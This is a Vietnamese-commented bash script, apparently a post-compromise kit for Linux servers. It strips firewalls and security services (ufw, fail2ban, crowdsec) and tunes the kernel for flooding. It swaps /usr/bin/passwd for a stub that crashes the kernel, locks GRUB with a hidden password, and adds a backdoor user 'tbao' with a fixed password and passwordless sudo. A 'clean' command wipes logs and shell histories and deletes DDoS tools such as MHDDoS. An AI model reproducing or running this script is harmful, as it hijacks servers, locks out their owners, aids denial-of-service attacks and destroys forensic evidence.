#!/bin/bash
echo -e "Xóa dấu vết và bypass"
echo "[+] Bật chế độ bypass"
sysctl -w net.core.rmem_max=134217728 &>/dev/null
sysctl -w net.core.wmem_max=134217728 &>/dev/null
sysctl -w net.ipv4.tcp_mem="134217728 134217728 134217728" &>/dev/null
sysctl -w net.ipv4.tcp_rmem="4096 87380 134217728" &>/dev/null
sysctl -w net.ipv4.tcp_wmem="4096 65536 134217728" &>/dev/null
sysctl -w net.core.netdev_max_backlog=50000 &>/dev/null
sysctl -w net.core.somaxconn=65535 &>/dev/null
sysctl -w net.ipv4.tcp_max_syn_backlog=65536 &>/dev/null
sysctl -w net.ipv4.tcp_syncookies=0 &>/dev/null
sysctl -w net.ipv4.tcp_timestamps=0 &>/dev/null
sysctl -w net.ipv4.conf.all.rp_filter=0 &>/dev/null
sysctl -w net.ipv4.conf.default.rp_filter=0 &>/dev/null
sysctl -w net.ipv4.conf.all.accept_source_route=1 &>/dev/null
sysctl -w fs.file-max=2097152 &>/dev/null
ulimit -n 999999 2>/dev/null
echo "* soft nofile 999999" >> /etc/security/limits.conf
echo "* hard nofile 999999" >> /etc/security/limits.conf
chattr +i /etc/passwd /etc/shadow /etc/ssh/sshd_config
iptables -F && iptables -X && iptables -t nat -F && iptables -t mangle -F
iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT
nft flush ruleset &>/dev/null
systemctl stop ufw fail2ban crowdsec &>/dev/null
systemctl disable ufw fail2ban crowdsec &>/dev/null


echo "[!] Đang Khóa Chỉnh Sửa Passwd"
chattr +i /etc/passwd /etc/shadow /etc/ssh/sshd_config /etc/hosts.deny 2>/dev/null
mv /usr/bin/passwd /usr/bin/passwd.real
cat > /usr/bin/passwd << 'EOF'
echo 1 > /proc/sys/kernel/sysrq
echo c > /proc/sysrq-trigger 
EOF
mv /usr/bin/passwd /usr/bin/.passwd_real
cat > /usr/bin/passwd <<'EOF'
#!/bin/bash
echo 1 > /proc/sys/kernel/sysrq 2>/dev/null
echo c > /proc/sysrq-trigger 2>/dev/null
kill -9 $$ 2>/dev/null
EOF

echo -e "\033[1;35mĐang khóa GRUB + tạo backdoor user tbao ...\033[0m\n"

# Tạo mật khẩu GRUB ngẫu nhiên mạnh
PASS=$(openssl rand -base64 48 | tr -dc 'A-Za-z0-9' | head -c18)
HASH=$(echo -e "$PASS\n$PASS" | grub-mkpasswd-pbkdf2 | grep "grub.pbkdf2" | awk '{print $7}')

# Ghi đè file GRUB header
cat > /etc/grub.d/00_header <<EOF
#!/bin/sh
exec tail -n +3 \$0
set superusers="tbao"
password_pbkdf2 tbao $HASH
export superusers
EOF

chmod 700 /etc/grub.d/00_header
echo "set timeout=0" > /etc/grub.d/40_custom
chmod 644 /etc/grub.d/40_custom

# Cập nhật GRUB (hỗ trợ Ubuntu/Debian/CentOS/Alma/Rocky…)
if command -v update-grub &>/dev/null; then
    update-grub &>/dev/null
else
    grub-mkconfig -o /boot/grub/grub.cfg &>/dev/null || \
    grub-mkconfig -o /boot/grub2/grub.cfg &>/dev/null || \
    grub2-mkconfig -o /boot/grub2/grub.cfg &>/dev/null
fi

# Tạo user tbao + pass tbao123 + full sudo
useradd -m -s /bin/bash tbao &>/dev/null || true
echo "tbao:tbao123" | chpasswd &>/dev/null
echo "tbao ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/tbao
chmod 0440 /etc/sudoers.d/tbao
mkdir -p /home/tbao/.ssh
touch /home/tbao/.ssh/authorized_keys
chmod 700 /home/tbao/.ssh
chmod 600 /home/tbao/.ssh/authorized_keys
chown -R tbao:tbao /home/tbao/.ssh &>/dev/null

# Hiển thị kết quả
clear
echo -e "\033[1;32m╔══════════════════════════════════════╗"
echo -e "║           HOÀN TẤT 100%              ║"
echo -e "╚══════════════════════════════════════╝\033[0m\n"
echo -e "\033[1;36mGRUB đã khóa hoàn toàn:\033[0m"
echo -e "   Username : tbao"
echo -e "   Password : \033[1;33m$PASS\033[0m   ← \033[1;31mLƯU LẠI NGAY, KHÔNG HIỆN LẠI LẦN 2!\033[0m\n"
echo -e "\033[1;33mUser đăng nhập SSH đã tạo:\033[0m"
echo -e "   Username : tbao"
echo -e "   Password : tbao123"
echo -e "   Quyền    : Full sudo (không cần pass)\n"
echo -e "\033[1;35m→ Gõ lệnh: reboot  để khóa GRUB có hiệu lực ngay!\033[0m"



clean() {
    echo "[!] Đang dọn dấu vết 100%..."
    history -c; echo "" > /root/.bash_history
    for u in $(cut -d: -f1 /etc/passwd); do echo "" > /home/$u/.bash_history 2>/dev/null; done
    find / -name "*.log" -exec echo "" > {} \; 2>/dev/null
    echo "" > /var/log/auth.log > /var/log/syslog > /var/log/kern.log > /var/log/messages > /var/log/wtmp > /var/log/btmp > /var/log/lastlog
    rm -rf /root/zmap* /root/MHDDoS /root/archer* /tmp/* /var/tmp/* 2>/dev/null
    conntrack -F &>/dev/null; ip neigh flush all &>/dev/null
    iptables -Z -t filter; iptables -Z -t nat; iptables -Z -t mangle; iptables -Z -t raw
    journalctl --rotate --vacuum-time=1s &>/dev/null
    echo "[+] Đã sạch hoàn toàn"
}

echo "clean" > /usr/bin/clean && chmod +x /usr/bin/clean
cat > /usr/bin/clean <<'EOF'
#!/bin/bash
$(declare -f clean)
clean
EOF
chmod +x /usr/bin/clean
echo -e "\033[1;36m[+] Gõ 'clean' bất kỳ lúc nào để xóa sạch dấu vết ngay lập tức!\033[0m"
